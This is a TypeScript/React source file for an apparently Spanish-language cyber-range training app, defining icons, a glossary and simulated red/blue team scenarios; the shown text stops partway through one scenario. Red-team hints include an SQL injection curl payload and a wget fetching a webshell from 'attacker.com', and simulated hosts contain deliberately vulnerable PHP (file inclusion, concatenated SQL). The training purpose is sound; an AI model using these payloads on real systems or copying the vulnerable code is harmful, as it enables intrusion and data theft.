import React from 'react';
import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment, CommandLibraryData } from './types';

// ============================================================================
// Icon Component (Lucide SVG paths)
// ============================================================================

interface IconProps extends React.SVGProps<SVGSVGElement> {
    name: string;
}

export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
    const iconPaths: { [key: string]: React.ReactNode } = {
        'book-open': <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2zM22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z" />,
        'graduation-cap': <><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c3 3 9 3 12 0v-5"/></>,
        'library': <><path d="m16 6 4 14"/><path d="M12 6v14"/><path d="M8 8v12"/><path d="M4 4v16"/></>,
        'terminal': <><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></>,
        'chevron-down': <polyline points="6 9 12 15 18 9" />,
        'check': <polyline points="20 6 9 17 4 12" />,
        'info': <><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></>,
        'layers': <><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 7 12 12 22 7"/><polyline points="2 17 12 22 22 17"/></>,
        'shield-alert': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4"/><path d="M12 16h.01"/></>,
        'network': <><rect x="16" y="16" width="6" height="6" rx="1"/><rect x="2" y="16" width="6" height="6" rx="1"/><rect x="9" y="2" width="6" height="6" rx="1"/><path d="M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3"/><path d="M12 12V8"/></>,
        'brain-circuit': <><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="M18 5a3 3 0 1 0-5.993.142"/><path d="M21 12a3 3 0 1 0-5.993.142"/><path d="M15 12a3 3 0 1 0-5.993.142"/><path d="M9 12a3 3 0 1 0-5.993.142"/><path d="M12 19a3 3 0 1 0-5.993.142"/><path d="M18 19a3 3 0 1 0-5.993.142"/><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="m14.65 6.01 1.35-.51"/><path d="m13.013 10.511 1.984-1.388"/><path d="m15.013 10.611 1.985 1.288"/><path d="m14.65 17.99 1.35.51"/><path d="m8.65 6.01 7.35-.5"/><path d="m9.013 10.511-1.984-1.388"/><path d="m7.013 10.611-1.985 1.288"/><path d="m8.65 17.99-1.35.51"/></>,
        'shield-off': <><path d="M19.69 14a6.9 6.9 0 0 0 .31-2V5l-8-3-8 3v7c0 6 8 10 8 10"/><path d="m2 2 20 20"/></>,
        'swords': <><path d="M14.5 17.5 3 6"/><path d="m21 3-9.5 9.5"/><path d="m6.5 12.5 11 11"/></>,
        'shield-check': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></>,
        'users': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></>,
        'sword': <><path d="m21.15 12.85-9.17 9.17a2 2 0 0 1-2.83 0L2.85 15.73a2 2 0 0 1 0-2.83l9.17-9.17a6 6 0 0 1 8.49 8.49Z"/><path d="m18 15-4-4"/></>,
        'map-pin': <><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></>,
        'book-open-check': <><path d="M8 3H2v15h7c1.7 0 3 1.3 3 3V7c0-2.2-1.8-4-4-4Z"/><path d="m16 12 2 2 4-4"/><path d="M16 3h6v15h-7c-1.7 0-3 1.3-3 3V7c0-2.2 1.8-4 4-4Z"/></>,
        'book-search': <><path d="M19 21H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v3"/><circle cx="16" cy="16" r="3"/><path d="m21 21-1.4-1.4"/></>,
        'book-copy': <><path d="M2 16s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 12s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 8s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 4s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><rect width="18" height="18" x="3" y="4" rx="2"/><path d="M21 8H10a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h11Z"/><path d="m14 12-2 2 2 2"/><path d="M12 16h3"/></>,
        'shield-half': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 22V2"/></>,
        'radio-tower': <><path d="M4.6 13.7 12 2l7.4 11.7"/><path d="M8.5 12h7"/><path d="M12 12V2"/><path d="m14 16-1-3-1 3h2"/><path d="m10 16-1-3-1 3h2"/><path d="m18 19-3-6-3 6h6"/><path d="m6 19-3-6-3 6h6"/></>,
        'alert-octagon': <><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></>,
        'refresh-cw': <><path d="M3 2v6h6"/><path d="M21 12A9 9 0 0 0 6 5.3L3 8"/><path d="M21 22v-6h-6"/><path d="M3 12a9 9 0 0 0 15 6.7l3-2.7"/></>,
        'search': <><circle cx="11" cy="11" r="8"/><line x1="21" x2="16.65" y1="21" y2="16.65"/></>,
        'chevrons-up': <><path d="m17 11-5-5-5 5"/><path d="m17 18-5-5-5 5"/></>,
        'flag': <><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" x2="4" y1="22" y2="15"/></>,
        'clipboard-list': <><rect width="8" height="4" x="8" y="2" rx="1" ry="1" /><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" /><path d="M12 11h4" /><path d="M12 16h4" /><path d="M8 11h.01" /><path d="M8 16h.01" /></>,
        'target': <><circle cx="12" cy="12" r="10" /><circle cx="12" cy="12" r="6" /><circle cx="12" cy="12" r="2" /></>,
        'file-text': <><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><line x1="16" x2="8" y1="13" y2="13" /><line x1="16" x2="8" y1="17" y2="17" /><line x1="10" x2="8" y1="9" y2="9" /></>,
        'alert-triangle': <><path d="m21.73 18-8-14a2 2 0 0 0-3.46 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></>,
        'binoculars': <><circle cx="15" cy="15" r="3"/><circle cx="9" cy="15" r="3"/><path d="M15 12v-3"/><path d="M9 12v-3"/><path d="m19 12-2-4"/><path d="m5 12 2-4"/></>,
        'file-clock': <><path d="M16 22h2a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v3"/><path d="M4 14a6 6 0 1 0 12 0 6 6 0 0 0-12 0Z"/><path d="M10 14.5V12h-1.5"/></>,
        'log-out': <><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" x2="9" y1="12" y2="12"/></>,
        'bomb': <><circle cx="12" cy="16" r="1"/><path d="M20 12a8 8 0 1 0-16 0"/><path d="M22 8s-1.5 0-3-2c-1.5-2-3-3-3-3"/><path d="m2 8 3-2c1.5-2 3-3 3-3"/></>,
        'download': <><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></>,
        'activity': <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>,
        'file-search': <><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><circle cx="10.5" cy="13.5" r="2.5" /><path d="M12.5 15.5 15 18" /></>,
        'power': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
        'plus-circle': <><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></>,
        'trash': <><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/></>,
        'keyboard': <><rect x="2" y="16" width="20" height="6" rx="2"/><path d="M6 10h4"/><path d="M14 10h4"/><path d="M6 6h.01"/><path d="M10 6h.01"/><path d="M14 6h.01"/><path d="M18 6h.01"/></>,
        'arrow-right-left': <><path d="m16 3 5 5-5 5"/><path d="M21 8H3"/><path d="m8 21-5-5 5-5"/><path d="M3 16h18"/></>,
        'user-x': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="m17 8-6 6"/><path d="m11 8 6 6"/></>,
        'alert-circle': <><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></>,
        'power-off': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
        'user-check': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><polyline points="16 11 18 13 22 9"/></>,
        'shield': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></>,
        'key': <><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></>,
        'crosshair': <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
        'star': <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>,
        'bot': <><rect width="18" height="10" x="3" y="11" rx="2"/><circle cx="12" cy="5" r="2"/><path d="M12 7v4"/><line x1="8" x2="8" y1="16" y2="16"/><line x1="16" x2="16" y1="16" y2="16"/></>,
        'settings': <><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.47a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></>,
        'globe': <><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1 4-10z"/></>,
        'zap': <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
    };

    return (
        <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className={className}
            {...props}
        >
            {iconPaths[name] || null}
        </svg>
    );
};


export const CisoCard: React.FC<{ icon?: string; title?: string; children: React.ReactNode }> = ({ icon, title, children }) => (
    <div className="bg-black/60 backdrop-blur-md border border-white/10 rounded-xl p-4 sm:p-6 mb-6 last:mb-0 transition-all duration-300 hover:bg-black/80 hover:border-cyan-500/30 hover:shadow-[0_0_20px_rgba(6,182,212,0.1)]">
        {title && (
            <h4 className="text-[var(--cv-gold)] font-bold text-lg mb-3 flex items-center">
                {icon && <Icon name={icon} className="h-5 w-5 mr-2 flex-shrink-0" />}
                {title}
            </h4>
        )}
        <div className="text-[var(--text-secondary)] text-sm sm:text-base leading-relaxed space-y-2">
            {children}
        </div>
    </div>
);

export const CisoTable: React.FC<{ headers: string[]; rows: (string | React.ReactNode)[][] }> = ({ headers, rows }) => (
    <div className="overflow-x-auto border border-slate-800 rounded-lg my-4 shadow-lg bg-black/80">
        <table className="w-full min-w-[600px] border-collapse">
            <thead>
                <tr>
                    {headers.map((header, i) => (
                        <th key={i} className="p-3 text-left text-sm font-semibold bg-black/90 text-[var(--cv-gold)] whitespace-nowrap border-b border-slate-700">{header}</th>
                    ))}
                </tr>
            </thead>
            <tbody>
                {rows.map((row, i) => (
                    <tr key={i} className="hover:bg-white/5 transition-colors border-b border-slate-800/50 last:border-b-0">
                        {row.map((cell, j) => (
                            <td key={j} className="p-3 text-sm text-[var(--text-secondary)]">{cell}</td>
                        ))}
                    </tr>
                ))}
            </tbody>
        </table>
    </div>
);

// ============================================================================
// Restored Constants
// ============================================================================

export const GLOSSARY_TERMS: GlossaryTerm[] = [
    { term: "SOC", definition: "Security Operations Center - Centro de Operaciones de Seguridad. Unidad centralizada responsable de monitorear, detectar y responder a amenazas de ciberseguridad." },
    { term: "Blue Team", definition: "Equipo defensivo responsable de proteger la infraestructura, monitorear logs y responder a incidentes." },
    { term: "Red Team", definition: "Equipo ofensivo que simula ser un atacante para probar la efectividad de las defensas." },
    { term: "CISO", definition: "Chief Information Security Officer - Director de Seguridad de la Información." },
    { term: "SIEM", definition: "Security Information and Event Management - Sistema para centralizar y analizar logs." },
    { term: "DMZ", definition: "Demilitarized Zone - Red perimetral que expone servicios al exterior protegiendo la red interna." },
    { term: "Firewall", definition: "Sistema de seguridad de red que monitorea y controla el tráfico entrante y saliente." }
];

export const RESOURCE_MODULES: ResourceModule[] = [
    {
        id: 'module-1',
        icon: 'shield',
        title: 'Fundamentos del SOC',
        content: <div>
            <p className="text-slate-300 mb-4">El Centro de Operaciones de Seguridad (SOC) es el corazón de la defensa cibernética moderna.</p>
            <h5 className="text-cyan-400 font-bold mb-2">Funciones Principales:</h5>
            <ul className="list-disc pl-5 text-slate-400 space-y-2">
                <li><strong className="text-white">Monitoreo:</strong> Vigilancia 24/7 de la infraestructura.</li>
                <li><strong className="text-white">Detección:</strong> Identificación de actividades sospechosas.</li>
                <li><strong className="text-white">Respuesta:</strong> Contención y erradicación de amenazas.</li>
            </ul>
        </div>
    },
    {
        id: 'module-2',
        icon: 'terminal',
        title: 'Comandos Esenciales Linux',
        content: <div>
            <p className="text-slate-300 mb-4">Linux es el sistema operativo estándar en ciberseguridad.</p>
            <div className="grid grid-cols-2 gap-4 text-sm">
                <div className="bg-black/40 p-2 rounded border border-slate-800">
                    <code className="text-yellow-400 block">ls -la</code>
                    <span className="text-slate-500">Listar archivos (detallado)</span>
                </div>
                <div className="bg-black/40 p-2 rounded border border-slate-800">
                    <code className="text-yellow-400 block">grep "error" log.txt</code>
                    <span className="text-slate-500">Buscar texto en archivo</span>
                </div>
                <div className="bg-black/40 p-2 rounded border border-slate-800">
                    <code className="text-yellow-400 block">chmod 700 file</code>
                    <span className="text-slate-500">Cambiar permisos</span>
                </div>
                <div className="bg-black/40 p-2 rounded border border-slate-800">
                    <code className="text-yellow-400 block">ps aux</code>
                    <span className="text-slate-500">Ver procesos activos</span>
                </div>
            </div>
        </div>
    }
];

const INITIAL_ENV_SCENARIO_7: VirtualEnvironment = {
    networks: {
        dmz: {
            hosts: [{
                ip: '10.0.10.5',
                hostname: 'BOVEDA-WEB',
                os: 'linux',
                services: {
                    22: { name: 'ssh', version: 'OpenSSH 7.6', state: 'open', vulnerabilities: [] },
                    80: { name: 'http', version: 'Apache 2.4', state: 'open', vulnerabilities: [] }
                },
                users: [
                    { username: 'admin', password: 'P@ssw0rd', privileges: 'user' },
                    { username: 'root', password: 'toor', privileges: 'root' }
                ],
                files: [
                     { path: '/etc/ssh/sshd_config', permissions: '644', hash: 'orig', content: 'PermitRootLogin yes\nPasswordAuthentication yes' },
                     { path: '/var/www/html/index.php', permissions: '644', hash: 'orig', content: '<h1>Boveda Web</h1>' },
                     { path: '/var/www/html/db_config.php', permissions: '644', hash: 'orig', content: '<?php $pass="secret"; ?>' }
                ],
                systemState: { cpuLoad: 5, memoryUsage: 20, networkConnections: 10, failedLogins: 0 }
            }],
            firewall: { enabled: false, rules: [] },
            ids: { enabled: false, signatures: [], alerts: [] }
        }
    },
    attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
    defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
    timeline: []
};

const INITIAL_ENV_SCENARIO_8: VirtualEnvironment = {
    networks: {
        dmz: {
            hosts: [{
                ip: '10.0.20.10',
                hostname: 'PORTAL-WEB',
                os: 'linux',
                services: {
                    22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                    80: { name: 'http', version: 'Nginx 1.18', state: 'open', vulnerabilities: [] }
                },
                users: [
                    { username: 'admin', password: 'P@ssw0rd', privileges: 'user' },
                    { username: 'root', password: 'toor', privileges: 'root' }
                ],
                files: [
                     { path: '/var/www/html/index.php', permissions: '644', hash: 'orig', content: '<h1>Portal Corporativo</h1>' },
                     { path: '/var/log/auth.log', permissions: '640', hash: 'log', content: '' }
                ],
                systemState: { cpuLoad: 95, memoryUsage: 80, networkConnections: 5000, failedLogins: 150 }
            }],
            firewall: { enabled: true, rules: [] },
            ids: { enabled: true, signatures: [], alerts: [] }
        }
    },
    attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
    defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
    timeline: []
};

const INITIAL_ENV_SCENARIO_9: VirtualEnvironment = {
    networks: {
        dmz: {
            hosts: [{
                ip: '10.0.0.10',
                hostname: 'WEB-DMZ-01',
                os: 'linux',
                services: {
                    22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                    80: { name: 'http', version: 'nginx 1.18', state: 'open', vulnerabilities: [{ cve: 'CVE-LFI', description: 'LFI in view.php', severity: 'high' }] }
                },
                users: [
                    { username: 'www-data', password: 'x', privileges: 'user' },
                    { username: 'root', password: 'x', privileges: 'root' }
                ],
                files: [
                     { path: '/var/www/html/index.php', permissions: '644', hash: 'orig', content: '<h1>Welcome to DMZ</h1>' },
                     { path: '/var/www/html/view.php', permissions: '644', hash: 'vuln', content: '<?php include($_GET["file"]); ?>' },
                     { path: '/var/www/html/config.php', permissions: '640', hash: 'cred', content: '$db_host = "10.10.0.50"; $db_user = "webapp"; $db_pass = "WebAppP@ss2024";' },
                     { path: '/etc/passwd', permissions: '644', hash: 'sys', content: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' }
                ],
                systemState: { cpuLoad: 10, memoryUsage: 30, networkConnections: 50, failedLogins: 0 }
            }],
            firewall: { enabled: true, rules: [] },
            ids: { enabled: true, signatures: [], alerts: [] }
        },
        internal: {
            hosts: [{
                ip: '10.10.0.50',
                hostname: 'DB-FINANCE-01',
                os: 'linux',
                services: {
                    22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                    3306: { name: 'mysql', version: 'MySQL 8.0', state: 'open', vulnerabilities: [] }
                },
                users: [
                    { username: 'root', password: 'DbP@ss2024!', privileges: 'root' }
                ],
                files: [
                    { path: '/db/finance_backup.sql', permissions: '600', hash: 'secret', content: 'INSERT INTO credit_cards VALUES ...' }
                ],
                systemState: { cpuLoad: 5, memoryUsage: 40, networkConnections: 5, failedLogins: 0 }
            }],
            firewall: { enabled: true, rules: [] },
            ids: { enabled: false, signatures: [], alerts: [] }
        }
    },
    attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
    defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
    timeline: []
};

export const incidentReportScenario: InteractiveScenario = {
    id: 'escenario11',
    isInteractive: true,
    icon: 'file-text',
    color: 'bg-purple-600',
    title: 'El Primer Reporte (Documentación de Incidentes)',
    subtitle: 'Respuesta completa a incidentes con documentación profesional según formato ESIT.',
    description: 'Un incidente de seguridad real requiere documentación profesional. El Equipo Rojo ejecuta un ataque multi-fase mientras el Equipo Azul debe detectarlo, contenerlo y documentar TODO según el formato oficial ESIT.',
    difficulty: 'intermediate',
    team: 'both',
    
    initialEnvironment: {
        networks: {
            'dmz': {
                hosts: [{
                    ip: '10.0.50.10',
                    hostname: 'APP-SERVER-01',
                    os: 'linux',
                    services: {
                        22: { name: 'ssh', version: 'OpenSSH 8.4', state: 'open', vulnerabilities: [] },
                        80: { name: 'apache', version: 'Apache 2.4.46', state: 'open', vulnerabilities: [
                            { cve: 'CVE-2021-WEBAPP', description: 'SQL Injection in login form', severity: 'critical' }
                        ]},
                        443: { name: 'apache-ssl', version: 'Apache 2.4.46', state: 'open', vulnerabilities: [] },
                        3306: { name: 'mysql', version: 'MySQL 8.0.26', state: 'open', vulnerabilities: [] }
                    },
                    users: [
                        { username: 'webadmin', password: 'WebAdmin2024!', privileges: 'admin' },
                        { username: 'blue-team', password: 'BlueTeam$ecure2024', privileges: 'admin' },
                        { username: 'dbuser', password: 'DbUser123', privileges: 'user' }
                    ],
                    files: [
                        { path: '/var/www/html/login.php', permissions: '644', content: '<?php\n// Vulnerable login form\n$user = $_POST["user"];\n$pass = $_POST["pass"];\n$query = "SELECT * FROM users WHERE user=\'$user\' AND pass=\'$pass\'";\n?>', hash: 'webapp_hash_123' },
                        { path: '/var/www/html/admin.php', permissions: '644', content: '<?php\n// Admin panel\nif($_SESSION["admin"]) { echo "Welcome Admin"; }\n?>', hash: 'admin_hash_456' },
                        { path: '/var/log/apache2/access.log', permissions: '640', content: '', hash: 'log_hash_789' },
                        { path: '/var/log/apache2/error.log', permissions: '640', content: '', hash: 'log_hash_790' },
                        { path: '/home/blue-team/incident_report.txt', permissions: '600', content: '', hash: 'report_hash_001' },
                        { path: '/home/blue-team/red_team_report.txt', permissions: '600', content: '', hash: 'report_hash_002' }
                    ],
                    systemState: {
                        cpuLoad: 8.0,
                        memoryUsage: 35.0,
                        networkConnections: 45,
                        failedLogins: 0
                    }
                }],
                firewall: {
                    enabled: true,
                    rules: [
                        { id: 'fw-1', action: 'allow', protocol: 'tcp', destPort: 22 },
                        { id: 'fw-2', action: 'allow', protocol: 'tcp', destPort: 80 },
                        { id: 'fw-3', action: 'allow', protocol: 'tcp', destPort: 443 }
                    ]
                },
                ids: {
                    enabled: true,
                    signatures: ['SQL_INJECTION', 'WEB_SHELL_UPLOAD', 'SUSPICIOUS_QUERIES'],
                    alerts: []
                }
            }
        },
        attackProgress: {
            reconnaissance: [],
            compromised: [],
            credentials: {},
            persistence: []
        },
        defenseProgress: {
            hardenedHosts: [],
            blockedIPs: [],
            patchedVulnerabilities: []
        },
        timeline: []
    },
    
    objectives: [
        // === EQUIPO ROJO - FASE 1: RECONOCIMIENTO Y EXPLOTACIÓN ===
        {
            id: 'red-reconnaissance',
            description: 'Fase 1: Reconocimiento - Escanear APP-SERVER-01 e identificar servicios vulnerables',
            points: 10,
            required: true,
            validator: (env) => env.attackProgress.reconnaissance.includes('10.0.50.10'),
            hint: 'Usa: nmap -sV -sC APP-SERVER-01 para enumerar servicios y versiones'
        },
        {
            id: 'red-webapp-exploit',
            description: 'Fase 2: Explotación - Ejecutar SQL Injection en el formulario de login',
            points: 25,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'red' && 
                    (log.message.includes("curl") || log.message.includes("sqlmap")) &&
                    log.message.includes("login.php")
                );
            },
            hint: "Usa: curl -X POST http://APP-SERVER-01/login.php -d \"user=admin' OR '1'='1&pass=anything\""
        },
        {
            id: 'red-access-admin',
            description: 'Fase 3: Acceso - Obtener acceso al panel de administración',
            points: 20,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'red' && 
                    log.message.includes("admin.php")
                );
            },
            hint: 'Después del SQL Injection exitoso, accede a: curl http://APP-SERVER-01/admin.php'
        },
        {
            id: 'red-webshell-upload',
            description: 'Fase 4: Persistencia - Subir webshell para mantener acceso',
            points: 25,
            required: true,
            validator: (env) => env.attackProgress.persistence.includes('webshell_deployed'),
            hint: 'Simula: wget http://attacker.com/shell.php -O /var/www/html/shell.php'
        },
        {
            id: 'red-data-exfiltration',
            description: 'Fase 5: Exfiltración - Extraer datos de la base de datos',
            points: 20,
            required: true,
            validator: (env) => env.attackProgress.persistence.includes('data_exfiltrated'),
            hint: 'Ejecuta comandos SQL para extraer datos sensibles de la base de datos'
        },
        {
            id: 'red-report-creation',
            description: '📋 CRÍTICO: Elaborar reporte de ataque documentando TODAS las fases ejecutadas',
            points: 30,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'red' && 
                    log.message.includes("nano /home/blue-team/red_team_report.txt")
                );
            },
            hint: 'FORMATO REQUERIDO:\n1. Vectores de ataque utilizados\n2. Vulnerabilidades explotadas (CVE)\n3. Comandos ejecutados (timeline completa)\n4. Datos comprometidos\n5. Nivel de acceso obtenido\n6. Persistencia establecida\n7. Recomendaciones de remediación'
        },
        
        // === EQUIPO AZUL - DETECCIÓN, CONTENCIÓN Y DOCUMENTACIÓN ===
        {
            id: 'blue-detection-scan',
            description: 'Fase 1: Detección - Identificar el escaneo de reconocimiento en logs',
            points: 10,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'blue' && 
                    (log.message.includes("grep") || log.message.includes("tail")) &&
                    log.message.includes("access.log")
                );
            },
            hint: 'Revisa logs: tail -f /var/log/apache2/access.log | grep -i "nmap\|scan"'
        },
        {
            id: 'blue-detection-sqli',
            description: 'Fase 2: Detección - Identificar intentos de SQL Injection',
            points: 15,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'blue' && 
                    log.message.includes("grep") && 
                    (log.message.includes("OR") || log.message.includes("UNION") || log.message.includes("'"))
                );
            },
            hint: 'Busca patrones SQL: grep -i "OR\|UNION\|SELECT\|\'\"" /var/log/apache2/access.log'
        },
        {
            id: 'blue-containment-block',
            description: 'Fase 3: Contención - Bloquear IP del atacante inmediatamente',
            points: 20,
            required: true,
            validator: (env) => {
                return env.networks.dmz.firewall.rules.some(r => 
                    r.action === 'deny' && 
                    r.sourceIP === '192.168.1.100'
                );
            },
            hint: 'Ejecuta: sudo ufw deny from 192.168.1.100 (IP del atacante)'
        },
        {
            id: 'blue-containment-services',
            description: 'Fase 4: Contención - Detener servicios comprometidos',
            points: 15,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'blue' && 
                    log.message.includes("systemctl stop apache2")
                );
            },
            hint: 'Detén el servicio web: sudo systemctl stop apache2'
        },
        {
            id: 'blue-forensics-evidence',
            description: 'Fase 5: Forense - Recolectar evidencias del ataque',
            points: 20,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'blue' && 
                    (log.message.includes("sha256sum") || log.message.includes("md5sum"))
                );
            },
            hint: 'Genera hashes de archivos críticos: sha256sum /var/www/html/*.php > /home/blue-team/evidence_hashes.txt'
        },
        {
            id: 'blue-forensics-logs',
            description: 'Fase 6: Forense - Preservar logs del incidente',
            points: 15,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'blue' && 
                    log.message.includes("cp") && 
                    log.message.includes("access.log")
                );
            },
            hint: 'Preserva logs: sudo cp /var/log/apache2/access.log /home/blue-team/incident_access.log'
        },
        {
            id: 'blue-remediation',
            description: 'Fase 7: Remediación - Aplicar parches de seguridad',
            points: 20,
            required: true,
            validator: (env) => {
                return env.defenseProgress.patchedVulnerabilities.includes('CVE-2021-WEBAPP');
            },
            hint: 'Simula parcheo: sudo nano /var/www/html/login.php (corrige la query SQL usando prepared statements)'
        },
        {
            id: 'blue-report-creation',
            description: '📋 CRÍTICO: Elaborar Reporte de Incidente completo siguiendo formato ESIT',
            points: 35,
            required: true,
            validator: (env) => {
                return env.timeline.some(log => 
                    log.source_team === 'blue' && 
                    log.message.includes("nano /home/blue-team/incident_report.txt")
                );
            },
